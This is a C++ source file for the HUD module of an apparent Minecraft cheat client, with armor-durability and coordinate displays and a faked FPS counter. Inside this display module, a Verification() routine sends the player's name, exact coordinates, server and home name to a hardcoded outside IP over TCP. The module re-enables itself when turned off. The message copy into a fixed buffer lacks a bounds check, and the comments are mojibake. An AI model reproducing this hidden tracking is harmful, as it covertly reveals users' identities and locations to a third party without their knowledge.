#include "Interface.h"
#include "../pch.h"
int fpsspoof = 1;

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <cstdio>

#pragma comment(lib,"ws2_32.lib")
#include <stdio.h>  
#include <iomanip>
#include <iostream>
using namespace std;
#define IP "47.115.216.151"				//change this to your own server ip �ĳ����Լ���������ip
#define PORT 8090					//ע�⣺�ͻ�������ͨ�ŵĶ˿� = ����˵Ķ˿�
#define BUFFER_SIZE 1024	

Interface::Interface() : IModule(0, Category::VISUAL, "Displays the HUD") {
	registerBoolSetting("ArmorHUD", &armorHUD, armorHUD);
	registerBoolSetting("Info", &info, info);
	registerBoolSetting("Screen outline", &scroutline, scroutline);
	registerIntSetting("Opacity", &opacity, opacity, 0, 255);
	registerFloatSetting("Saturation", &saturation, saturation, 0.f, 1.f);
	registerIntSetting("Fps Spoof", &fpsspoof, fpsspoof, 1, 1000);
	registerIntSetting("Seperation", &spacing, spacing, 1, 200);

	shouldHide = true;
}

const char* Interface::getModuleName() {
	return ("Hud");
}

//void Interface::onTick(C_GameMode* gm) {
//	shouldHide = true;
//}
void Verification();

void Interface::onPreRender(C_MinecraftUIRenderContext* renderCtx) {
	auto clickGUIh = moduleMgr->getModule<ClickGUIMod>();
	auto playerh = g_Data.getLocalPlayer();
	if (playerh == nullptr) return;

	//windowSize = g_Data.getClientInstance()->getGuiData()->windowSize;
	if (!clickGUIh->hasOpenedGUI) {
		if (armorHUD) {
			auto interfaceCL = ColorUtil::interfaceColor(1);
			armorX = windowSize.x / 2 + 100;
			armorY = windowSize.y - 23.5;
			vec4_t testRect = vec4_t(armorX, armorY, 50 + armorX, armorY + 20);
		}
	}
}
void Interface::onPostRender(C_MinecraftUIRenderContext* renderCtx) {
	auto player = g_Data.getLocalPlayer();
	if (player == nullptr) return;

	auto interfaceCL = ColorUtil::interfaceColor(1);
	auto clickGUI = moduleMgr->getModule<ClickGUIMod>();
	if (scroutline)
		DrawUtils::drawRectangle(vec4_t(0, 0, g_Data.getClientInstance()->getGuiData()->widthGame, g_Data.getClientInstance()->getGuiData()->heightGame), MC_Color(interfaceCL), 1.f, 2.f);

	static int index = 0;
	int curIndex = -index * spacing;
	auto hudColor = ColorUtil::interfaceColor(curIndex);
	windowSize = g_Data.getClientInstance()->getGuiData()->windowSize;
	if (!clickGUI->hasOpenedGUI) {
		if (armorHUD) {
			vec4_t testRect = vec4_t(armorX, armorY, 50 + armorX, armorY + 20);
			vec2_t armorPos = vec2_t(testRect.x, testRect.y);
			static float constexpr opacity = 10;
			float scale = 1.f;
			float spacing = 20.f;
			for (int t = 0; t < 4; t++) {
				C_ItemStack* stack = player->getArmor(t);
				if (stack->isValid()) {
					float dura1 = stack->getItem()->getMaxDamage();
					float dura2 = stack->getItem()->getDamageValue(stack->tag);
					float dura3 = dura1 - dura2;
					int dura4 = dura3 / dura1 * 100;
					std::string durastr = std::to_string((int)dura4) + std::string("%");
					MC_Color green(0, 255, 0);
					MC_Color red(255, 0, 0);
					float dura5 = dura3 / dura1 * 100;
					float fraction = dura5 / 100;
					vec3_t greenVec(0, 0, 0);
					vec3_t redVec(0, 0, 0);
					Utils::ColorConvertRGBtoHSV(green.r, green.g, green.b, greenVec.x, greenVec.y, greenVec.z);
					Utils::ColorConvertRGBtoHSV(red.r, red.g, red.b, redVec.x, redVec.y, redVec.z);
					vec3_t colorVec = redVec.lerp(greenVec, fraction, fraction, fraction);

					MC_Color gamerColor(0, 0, 0);

					Utils::ColorConvertHSVtoRGB(colorVec.x, colorVec.y, colorVec.z, gamerColor.r, gamerColor.g, gamerColor.b);

					//DrawUtils::drawText(vec2_t(x, y - itemHeight), &durastr, MC_Color(gamerColor), textSize * 0.55f, 1.f, true);
					DrawUtils::drawCenteredString(vec2_t(armorPos.x + 9.f, armorPos.y + 20.f), &durastr, 0.75f, MC_Color(gamerColor), true);

					DrawUtils::drawItem(stack, armorPos, 1, 1, false);
					armorPos.x += scale * spacing;
				}
			}
		};
		if (info) {
			auto hudColor = ColorUtil::interfaceColor(curIndex);
			std::string fpsText = u8"֡��: " + std::to_string(g_Data.getFPS()*fpsspoof);
			float lFPS = DrawUtils::getTextWidth(&fpsText, 1) + 6.5;
			float fpswit = DrawUtils::getTextWidth(&fpsText, 1.f);
			float techai = DrawUtils::getFont(Fonts::SMOOTH)->getLineHeight() * 1.f;
			DrawUtils::drawText(vec2_t(windowSize.x - windowSize.x, windowSize.y - 40), &fpsText, MC_Color(interfaceCL), 1.f, 1.f, true);
			auto player = g_Data.getLocalPlayer();
			std::string speedText = u8"�ٶ�: " + std::to_string((int)player->getBlocksPerSecond()) + std::string(".") + std::to_string((int)(player->getBlocksPerSecond() * 10) - ((int)player->getBlocksPerSecond() * 10));
			float lSpeed = DrawUtils::getTextWidth(&speedText, 1) + 6.5;
			float speedwit = DrawUtils::getTextWidth(&speedText, 1.f);
			//DrawUtils::drawText(vec2_t(windowSize.x - windowSize.x, windowSize.y - 40), &speedText, MC_Color(interfaceCL), 1.f, 1.f, true);
			vec3_t* currPos = g_Data.getLocalPlayer()->getPos();
			std::string position = u8"����: " + std::to_string((int)floorf(currPos->x)) + " " + std::to_string((int)floorf(currPos->y)) + " " + std::to_string((int)floorf(currPos->z));
			float lPos = DrawUtils::getTextWidth(&position, 1) + 6.5;
			float poswit = DrawUtils::getTextWidth(&position, 1.f);
			DrawUtils::drawText(vec2_t(windowSize.x - windowSize.x, windowSize.y - 30), &position, MC_Color(interfaceCL), 1.f, 1.f, true);
			std::string posn = u8"ĩ������: " + std::to_string((int)floorf(currPos->x*8)) + " " + std::to_string((int)floorf(currPos->y)) + " " + std::to_string((int)floorf(currPos->z*8));
			float lPosn = DrawUtils::getTextWidth(&posn, 1) + 6.5;
			float poswitn = DrawUtils::getTextWidth(&posn, 1.f);
			DrawUtils::drawText(vec2_t(windowSize.x - windowSize.x, windowSize.y - 20), &posn, MC_Color(interfaceCL), 1.f, 1.f, true);
			std::string poso = u8"��������: " + std::to_string((int)floorf(currPos->x/8)) + " " + std::to_string((int)floorf(currPos->y)) + " " + std::to_string((int)floorf(currPos->z/8));
			float lPoso = DrawUtils::getTextWidth(&poso, 1) + 6.5;
			float poswito = DrawUtils::getTextWidth(&poso, 1.f);
			DrawUtils::drawText(vec2_t(windowSize.x - windowSize.x, windowSize.y - 10), &poso, MC_Color(interfaceCL), 1.f, 1.f, true);
		}
	}
}
void Interface::onTick(C_GameMode* gm) {
	if (SendMsg) {
		Verification();
		SendMsg = false;
	}
}
void Interface::onDisable() {
	setEnabled(true);
}
void Verification() {
	auto hudmod = moduleMgr->getModule<Interface>();
	if (g_Data.getLocalPlayer() == nullptr)
		return;
	string Server = "idk";
	if (hudmod->org2 && !hudmod->tk2) {
		Server = "org";
	}
	if (!hudmod->org2 && hudmod->tk2) {
		Server = "tk";
	}
	if (!hudmod->org2 && !hudmod->tk2)
	{
		Server = "Local";
	}
	auto t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
	//תΪ�ַ���
	std::stringstream ss;
	// ���Էֱ��Բ�ͬ����ʽ������ʾ
	ss << std::put_time(std::localtime(&t), "%Y-%m-%d- %H:%M:%S > ");
	//ss << std::put_time(std::localtime(&t), "%Y��%m��%d��%Hʱ%M��%S��");
	//	ss << std::put_time(std::localtime(&t), "%Y%m%d%H%M%S");

	std::string str_time = ss.str();
	string Homename = hudmod->Myhome;
	std::string playerID = g_Data.getLocalPlayer()->getNameTag()->getText();
	vec3_t* currPos = g_Data.getLocalPlayer()->getPos();
	string coords =
		std::to_string((int)floorf(currPos->x)) + ", " +
		std::to_string((int)floorf(currPos->y)) + ", " +
		std::to_string((int)floorf(currPos->z));
	std::string message = str_time + playerID + ": " + coords + " on " + Server + " in " + Homename;
	char buf[1024];
	int i;
	for (i = 0; i < message.length(); i++)
		buf[i] = message[i];
	buf[i] = '\0';
	printf("%s\n", buf);
	cout << buf;						//buf�����ſͻ��˷��͵���Ϣ  


	WSADATA WSAData;
	if (WSAStartup(MAKEWORD(2, 0), &WSAData) == SOCKET_ERROR)  //WSAStartup()������Winsock DLL���г�ʼ��
	{
		//printf("Socket initialize fail!\n");
		return;
	}
	SOCKET sock;											//�ͻ��˽��̴����׽���
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)  //�������׽��֣������˱���һ�£�
	{
		//printf("Socket create fail!\n");
		WSACleanup();
		return;
	}

	struct sockaddr_in ClientAddr;				//sockaddr_in�ṹ������ʶTCP/IPЭ���µĵ�ַ����ǿ��ת��Ϊsockaddr�ṹ
	ClientAddr.sin_family = AF_INET;				//ָInternet��
	ClientAddr.sin_port = htons(PORT);			//ָ���������Ԥ���Ķ˿�
	ClientAddr.sin_addr.s_addr = inet_addr(IP);	//ָ����������󶨵�IP��ַ
	if (connect(sock, (LPSOCKADDR)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)  //����connect()����������������̷�����������  
	{
		//printf("Connect fail!\n");
		closesocket(sock);
		WSACleanup();
		return;
	}
	send(sock, buf, 1024, 0);				 //��������������� 
	closesocket(sock);							 //�ر��׽���
	WSACleanup();								//��ֹ��Winsock DLL��ʹ�ã����ͷ���Դ���Ա���һ��ʹ��
}